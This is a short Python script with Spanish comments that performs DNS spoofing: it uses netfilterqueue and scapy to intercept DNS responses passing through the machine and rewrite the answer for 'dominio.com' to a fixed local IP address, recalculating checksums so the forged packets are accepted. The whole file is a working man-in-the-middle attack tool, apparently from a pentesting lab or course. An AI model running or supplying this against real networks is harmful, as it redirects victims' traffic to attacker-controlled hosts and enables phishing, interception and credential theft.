#!/usr/bin/env python3

# Importa las bibliotecas necesarias para manipular colas de paquetes y paquetes de red.
import netfilterqueue
import scapy.all as scapy
import signal
import sys

# Define un manejador de señales para permitir una salida limpia del script (ej. Ctrl+C).
def def_handler(sig, frame):
    print(f"\n[!] Saliendo...")
    sys.exit(1)

# Registra el manejador de señales para interrupciones del sistema (SIGINT).
signal.signal(signal.SIGINT, def_handler)

# Función para procesar cada paquete capturado por NetfilterQueue.
def process_packet(packet):
    # Convierte el paquete capturado en un paquete Scapy para facilitar su manipulación.
    scapy_packet = scapy.IP(packet.get_payload())

    # Verifica si el paquete es una respuesta DNS.
    if scapy_packet.haslayer(scapy.DNSRR):
        # Obtiene el nombre del dominio consultado desde la solicitud DNS.
        qname = scapy_packet[scapy.DNSQR].qname
        
        # Si el dominio consultado es el objetivo del "envenenamiento".
        if b"dominio.com" in qname:
            print(f"\n[+] Envenenado el dominio dominio.com")

            # Crea una respuesta DNS falsa apuntando al dominio consultado hacia una IP específica.
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40")  # IP de destino falsa
            # Reemplaza la respuesta DNS original con la falsa.
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Elimina los campos de longitud y checksum para forzar a Scapy a recalcularlos,
            # ya que se han realizado modificaciones en el paquete.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Reemplaza el paquete original en la cola con el paquete modificado.
            packet.set_payload(bytes(scapy_packet))

    # Acepta el paquete para que continúe su flujo normal en la red.
    packet.accept()

# Crea una instancia de NetfilterQueue.
queue = netfilterqueue.NetfilterQueue()
# Vincula la cola con el ID 0 a la función de procesamiento de paquetes.
queue.bind(0, process_packet)
# Inicia el bucle de procesamiento de paquetes.
queue.run()
